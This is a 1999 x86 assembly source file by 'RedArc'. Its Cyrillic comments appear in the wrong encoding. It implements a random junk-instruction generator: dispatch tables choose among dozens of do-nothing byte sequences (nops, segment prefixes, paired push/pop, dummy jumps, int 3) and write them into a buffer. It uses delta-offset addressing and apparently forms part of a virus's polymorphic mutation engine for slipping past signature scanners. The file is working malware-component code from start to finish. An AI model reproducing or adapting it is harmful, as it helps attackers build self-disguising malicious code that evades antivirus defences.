   ;ƒ¥¥à â®à ¬ãá®àëå ª®¬ ¤ (c) 1999 by RedArc
   ;DS:DI - ¡ãä¥à

   ;------------------------------------
   ; „¨á¯¥âç¥à á«ãç ©® ¢ë¡¨à ¥¬ëå ¡«®ª®¢
   Musor:
        push ax bx cx dx si
        xor cx,cx
        mov ah,3
        call RND_Tabelle
        cmp ah,0
        je MI_END
        mov cl,ah
   MI_A:
        push cx
        mov ax,@MI_B
        add ax,bp
        push ax
        mov ah,51
        call RND_Tabelle
        sub al,al
        xchg ah,al
        shl ax,1
        lea si,[bp+TabelleMusor]
        add si,ax
        mov ax,word ptr ds:[si]
        add ax,bp
        push ax
        ret
   @MI_B equ $-EntryPoint
   MI_B:
        pop cx
        loop MI_A
   MI_END:
        pop si dx cx bx ax
        ret
   ;---
   TabelleMusor equ $-EntryPoint
   dw @MI0,  @MI1,  @MI2,  @MI3,  @MI4,  @MI5,  @MI6,  @MI7,  @MI8,  @MI9
   dw @MI10, @MI11, @MI12, @MI13, @MI14, @MI15, @MI16, @MI17, @MI18, @MI19
   dw @MI20, @MI21, @MI22, @MI23, @MI24, @MI25, @MI26, @MI27, @MI28, @MI29
   dw @MI30, @MI31, @MI32, @MI33, @MI34, @MI35, @MI36, @MI37, @MI38, @MI39
   dw @MI40, @MI41, @MI42, @MI43, @MI44, @MI45, @MI46, @MI47, @MI48, @MI49
   dw @MI50, @MI51
   ;---
   @MI0 equ $-EntryPoint
   MI0: ;¥â ¬ãá®à 
        ret
   @MI1 equ $-EntryPoint
   MI1: ;nop
        mov al,90h
        stosb
        ret
   @MI2 equ $-EntryPoint
   MI2: ;std / cld
        mov ax,0fcfdh
        stosw
        ret
   @MI3 equ $-EntryPoint
   MI3: ;push R / call $+3 / pop R / pop R
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_NOP
        mov al,0e8h
        stosb
        xor ax,ax
        stosw
        mov bl,bh
        call Pop_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_NOP
        mov bl,bh
        call Pop_Reg16_Tabelle
        xchg bl,al
        stosb
        ret
   @MI4 equ $-EntryPoint
   MI4: ;fs:
        mov al,064h
        stosb
        call MI_MUS
        ret
   @MI5 equ $-EntryPoint
   MI5: ;gs:
        mov al,065h
        stosb
        call MI_MUS
        ret
   @MI6 equ $-EntryPoint
   MI6: ;ds:
        mov al,067h
        stosb
        call MI_MUS
        ret
   @MI7 equ $-EntryPoint
   MI7: ;cs:
        mov al,02eh
        stosb
        call MI_MUS
        ret
   @MI8 equ $-EntryPoint
   MI8: ;es:
        mov al,026h
        stosb
        call MI_MUS
        ret
   @MI9 equ $-EntryPoint
   MI9: ;jmps $+2
        mov ax,00ebh
        stosw
        ret
   @MI10 equ $-EntryPoint
   MI10: ;jmp $+3
        mov al,0e9h
        stosb
        xor ax,ax
        stosw
        ret
   @MI11 equ $-EntryPoint
   MI11: ; push ax / cbw /pop ax
        mov bx,0
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        mov al,098h
        stosb
        call MI_MUS
        mov bl,bh
        call Pop_Reg16_Tabelle
        xchg bl,al
        stosb
        ret
   @MI12 equ $-EntryPoint
   MI12: ;cli / sti
        mov ax,0fbfah
        stosw
        ret
   @MI13 equ $-EntryPoint
   MI13: ;cmc / cmc
        mov ax,0f5f5h
        stosw
        ret
   @MI14 equ $-EntryPoint
   MI14: ;push dx / cwd / pop dx
        mov bl,2
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        mov al,099h
        stosb
        call MI_MUS
        mov bl,2
        call Pop_Reg16_Tabelle
        xchg bl,al
        stosb
        ret
   @MI15 equ $-EntryPoint
   MI15: ;dec R / inc R
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        call Dec_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        mov bl,bh
        call Inc_Reg16_Tabelle
        xchg al,bl
        stosb
        ret
   @MI16 equ $-EntryPoint
   MI16: ;inc R / dec R
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        call Inc_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        mov bl,bh
        call Dec_Reg16_Tabelle
        xchg al,bl
        stosb
        ret
   @MI17 equ $-EntryPoint
   MI17: ;int 3h
        mov al,0cch
        stosb
        ret
   @MI18 equ $-EntryPoint
   MI18: ;int 3h
        mov ax,03cdh
        stosw
        ret
   @MI19 equ $-EntryPoint
   MI19: ;int 1h
        mov ax,01cdh
        stosw
        ret
   @MI20 equ $-EntryPoint
   MI20: ;clc / jnc $+2
        mov al,0f8h
        stosb
        call MI_NOP
        mov ax,0073h
        stosw
        ret
   @MI21 equ $-EntryPoint
   MI21: ;push ax / lahf / pop ax
        mov bl,0
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        mov al,09fh
        stosb
        call MI_MUS
        mov bl,0
        call Pop_Reg16_Tabelle
        xchg bl,al
        stosb
        ret
   @MI22 equ $-EntryPoint
   MI22: ;jmps $+3 / V8
        mov ax,01ebh
        stosw
        mov ah,0ffh
        call RND_Tabelle
        mov al,ah
        stosb
        ret
   @MI23 equ $-EntryPoint
   MI23: ;jmps $+4 / V16
        mov ax,02ebh
        stosw
        call _Calc_Rnd16
        xchg bx,ax
        stosw
        ret
   @MI24 equ $-EntryPoint
   MI24: ;jmp $+4 / V8
        mov al,0e9h
        stosb
        mov ax,01h
        stosw
        mov ah,0ffh
        call RND_Tabelle
        mov al,ah
        stosb
        ret
   @MI25 equ $-EntryPoint
   MI25: ;jmp $+5 / V16
        mov al,0e9h
        stosb
        mov ax,02h
        stosw
        call _Calc_Rnd16
        xchg bx,ax
        stosw
        ret
   @MI26 equ $-EntryPoint
   MI26: ;neg R / neg R
        mov bl,8
        call _Calc_Rnd_R16
        add bh,0d8h
        mov al,0f7h
        stosb
        mov al,bh
        stosb
        call MI_MUS
        mov al,0f7h
        stosb
        mov al,bh
        stosb
        ret
   @MI27 equ $-EntryPoint
   MI27: ;not R / not R
        mov bl,8
        call _Calc_Rnd_R16
        add bh,0d0h
        mov al,0f7h
        stosb
        mov al,bh
        stosb
        call MI_MUS
        mov al,0f7h
        stosb
        mov al,bh
        stosb
        ret
   @MI28 equ $-EntryPoint
   MI28: ;push R / pop R
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        mov bl,bh
        call Pop_Reg16_Tabelle
        mov al,bl
        stosb
        ret
   @MI29 equ $-EntryPoint
   MI29: ;pusha / popa
        mov ax,6160h
        stosw
        ret
   @MI30 equ $-EntryPoint
   MI30: ;pushf / popf
        mov ax,9d9ch
        stosw
        ret
   @MI31 equ $-EntryPoint
   MI31: ;rol R,1 / ror R,1
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        add bl,0c0h
        mov al,0d1h
        stosb
        mov al,bl
        stosb
        mov bl,bh
        call MI_MUS
        add bl,0c8h
        mov al,0d1h
        stosb
        mov al,bl
        stosb
        ret
   @MI32 equ $-EntryPoint
   MI32: ;ror R,1 / rol R,1
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        add bl,0c8h
        mov al,0d1h
        stosb
        mov al,bl
        stosb
        call MI_MUS
        mov bl,bh
        add bl,0c0h
        mov al,0d1h
        stosb
        mov al,bl
        stosb
        ret
   @MI33 equ $-EntryPoint
   MI33: ;push ax / lahf / sahf / pop ax
        mov bx,0
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        mov ax,09e9fh
        stosw
        call MI_MUS
        mov bx,0
        call Pop_Reg16_Tabelle
        mov al,bl
        stosb
        ret
   @MI34 equ $-EntryPoint
   MI34: ;push R / call $+4 / V8 / pop R / pop R
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_NOP
        mov al,0e8h
        stosb
        mov ax,1
        stosw
        mov ah,0ffh
        call RND_Tabelle
        mov al,ah
        stosb
        mov bl,bh
        call Pop_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_NOP
        mov bl,bh
        call Pop_Reg16_Tabelle
        xchg bl,al
        stosb
        ret
   @MI35 equ $-EntryPoint
   MI35: ;stc / clc
        mov ax,0f8f9h
        stosw
        ret
   @MI36 equ $-EntryPoint
   MI36: ;stc / jc $+2
        mov al,0f9h
        stosb
        mov ax,072h
        stosw
        ret
   @MI37 equ $-EntryPoint
   MI37: ;test R,V16
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        add bl,0c0h
        mov al,0f7h
        stosb
        mov al,bl
        stosb
        call _Calc_Rnd16
        xchg bx,ax
        stosw
        ret
   @MI38 equ $-EntryPoint
   MI38: ;xchg R,R
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        call Xchg_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        ret
   @MI39 equ $-EntryPoint
   MI39: ;xchg R1,R2 / xchg R2,R1
        mov bl,8
        call _Calc_Rnd_R16
        mov al,bh
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,al
        push bx
        call Xchg_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        call MI_NOP
        pop bx
        xchg bh,bl
        call Xchg_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        ret
   @MI40 equ $-EntryPoint
   MI40: ;push R / xor R,V16 / pop R
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        push bx
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        call _Calc_Rnd16
        xchg bx,ax
        pop bx
        push bx
        call Xor_Reg16_Value16_Tabelle
        call _ax_bx
        call MI_MUS
        pop bx
        call Pop_Reg16_Tabelle
        mov al,bl
        stosb
        ret
   @MI41 equ $-EntryPoint
   MI41: ;push R1 / xor R1/R2 / pop R1
        mov bl,8
        call _Calc_Rnd_R16
        mov al,bh
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,al
        push bx
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        pop bx
        push bx
        call Xor_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        call MI_MUS
        pop bx
        call Pop_Reg16_Tabelle
        mov al,bl
        stosb
        ret
   @MI42 equ $-EntryPoint
   MI42: ;add R,V16 / sub R,V16
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        push bx
        call _Calc_Rnd16
        xchg bx,ax
        pop bx
        push bx
        push ax
        call Add_Reg16_Value16_Tabelle
        call _ax_bx
        call MI_MUS
        pop ax
        pop bx
        call Sub_Reg16_Value16_Tabelle
        call _ax_bx
        ret
   @MI43 equ $-EntryPoint
   MI43: ;sub R,V16 / add R,V16
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        push bx
        call _Calc_Rnd16
        xchg bx,ax
        pop bx
        push bx
        push ax
        call Sub_Reg16_Value16_Tabelle
        call _ax_bx
        call MI_MUS
        pop ax
        pop bx
        call Add_Reg16_Value16_Tabelle
        call _ax_bx
        ret
   @MI44 equ $-EntryPoint
   MI44: ;add R1,R2 / sub R1,R2
        mov bl,8
        call _Calc_Rnd_R16
        mov al,bh
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,al
        push bx
        call Add_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        call MI_MUS
        pop bx
        call Sub_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        ret
   @MI45 equ $-EntryPoint
   MI45: ;sub R1,R2 / add R1,R2
        mov bl,8
        call _Calc_Rnd_R16
        mov al,bh
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,al
        push bx
        call Sub_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        pop bx
        call MI_MUS
        call Add_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        ret
   @MI46 equ $-EntryPoint
   MI46: ;push R / mov R,V16 / pop R
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,bh
        push bx
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        call _Calc_Rnd16
        xchg bx,ax
        pop bx
        push bx
        mov bl,bh
        call Mov_Reg16_Value16_Tabelle
        call _al_bx
        call MI_MUS
        pop bx
        call Pop_Reg16_Tabelle
        mov al,bl
        stosb
        ret
   @MI47 equ $-EntryPoint
   MI47: ;push R1 / mov R1,R2 / pop R1
        mov bl,8
        call _Calc_Rnd_R16
        mov al,bh
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,al
        push bx
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        pop bx
        push bx
        call Mov_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        call MI_MUS
        pop bx
        call Pop_Reg16_Tabelle
        mov al,bl
        stosb
        ret
   @MI48 equ $-EntryPoint
   MI48: ;push R1 / add R1,R2 / pop R1
        mov bl,8
        call _Calc_Rnd_R16
        mov al,bh
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,al
        push bx
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        pop bx
        push bx
        call Add_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        call MI_MUS
        pop bx
        call Pop_Reg16_Tabelle
        mov al,bl
        stosb
        ret
   @MI49 equ $-EntryPoint
   MI49: ;push R1 / sub R1,R2 / pop R1
        mov bl,8
        call _Calc_Rnd_R16
        mov al,bh
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,al
        push bx
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_MUS
        pop bx
        push bx
        call Sub_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        call MI_MUS
        pop bx
        call Pop_Reg16_Tabelle
        mov al,bl
        stosb
        ret
   @MI50 equ $-EntryPoint
   MI50: ;push R1 / mov R1,R2 / pop R2 / xchg R1,R2
        mov bl,8
        call _Calc_Rnd_R16
        mov al,bh
        mov bl,8
        call _Calc_Rnd_R16
        mov bl,al
        push bx
        call Push_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_NOP
        pop bx
        push bx
        call Mov_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        call MI_NOP
        pop bx
        push bx
        xchg bh,bl
        call Pop_Reg16_Tabelle
        mov al,bl
        stosb
        call MI_NOP
        pop bx
        call Xchg_Reg1_Reg2_16_Tabelle
        xchg bx,ax
        stosw
        ret
   @MI51 equ $-EntryPoint
   MI51: ;¥â ¬ãá®à 
        ret
   ;--
   ; „¨á¯¥âç¥à á«ãç ©® ¢áâ ¢«ï¥¬ëå/¥¢áâ ¢«ï¥¬ëå nop'®¢ ¢ á«®¦ë¥ ª®¬ ¤ë
   MI_NOP:
        push ax cx
        mov ah,3
        call RND_Tabelle
        cmp ah,0
        je MI_NOP_1
        mov cl,ah
   MI_NOP_0:
        call MI1
        loop MI_NOP_0
   MI_NOP_1:
        pop cx ax
        ret
   ;---
   ; „¨á¯¥âç¥à á«ãç ©® ¢áâ ¢«ï¥¬ëå/¥¢áâ ¢«ï¥¬ëå ¬ãá®àëå ª®¬ ¤ ¢ ¬ãá®à
   MI_MUS:
        push ax bx cx dx
        mov ah,5
        call RND_Tabelle
        cmp ah,0
        je MI_MUS_E
   MI_MUS_1:
        cmp ah,1
        jne MI_MUS_2
        call MI1
        jmp short MI_MUS_E
   MI_MUS_2:
        cmp ah,2
        jne MI_MUS_3
        call MI2
        jmp short MI_MUS_E
   MI_MUS_3:
        cmp ah,3
        jne MI_MUS_4
        call MI3
        jmp short MI_MUS_E
   MI_MUS_4:
        cmp ah,4
        jne MI_MUS_5
        call MI9
        jmp short MI_MUS_E
   MI_MUS_5:
        call MI50
   MI_MUS_E:
        pop dx cx bx ax
        ret
   ;------------------------------------
   ;„¨á¯¥âç¥à ®¤®¡ ©â®¢®£® ¬ãá®à 
   Musor1:
        push ax bx cx dx si
        mov ax,@MII_A
        add ax,bp
        push ax
        mov ah,0bh
        call RND_Tabelle
        sub al,al
        xchg ah,al
        shl ax,1
        lea si,[bp+TabelleMusor1]
        add si,ax
        mov ax,word ptr ds:[si]
        add ax,bp
        push ax
        ret
   @MII_A equ $-EntryPoint
   MII_A:
        pop si dx cx bx ax
        ret
   ;---
   TabelleMusor1 equ $-EntryPoint
     dw @M1, @M2, @M3, @M4, @M5, @M6, @M7, @M8, @M9, @Ma, @M1
   ;---

   @M1 equ $-EntryPoint
   @MII1: ;nop
        mov al,90h
        stosb
        ret
   @M2 equ $-EntryPoint
   @MII2: ;cld
        mov al,0fch
        stosb
        ret
   @M3 equ $-EntryPoint
   @MII3: ;sti
        mov al,0fbh
        stosb
        ret
   @M4 equ $-EntryPoint
   @MII4: ;clc
        mov al,0f8h
        stosb
        ret
   @M5 equ $-EntryPoint
   @MII5: ;int 3h
        mov al,0cch
        stosb
        ret
   @M6 equ $-EntryPoint
   @MII6: ;fs:
        mov al,064h
        stosb
        ret
   @M7 equ $-EntryPoint
   @MII7: ;gs:
        mov al,065h
        stosb
        ret
   @M8 equ $-EntryPoint
   @MII8: ;ds:
        mov al,067h
        stosb
        ret
   @M9 equ $-EntryPoint
   @MII9: ;cs:
        mov al,02eh
        stosb
        ret
   @Ma equ $-EntryPoint
   @MIIa: ;es:
        mov al,026h
        stosb
        ret
   ;------------------------------------
   include code16.inc
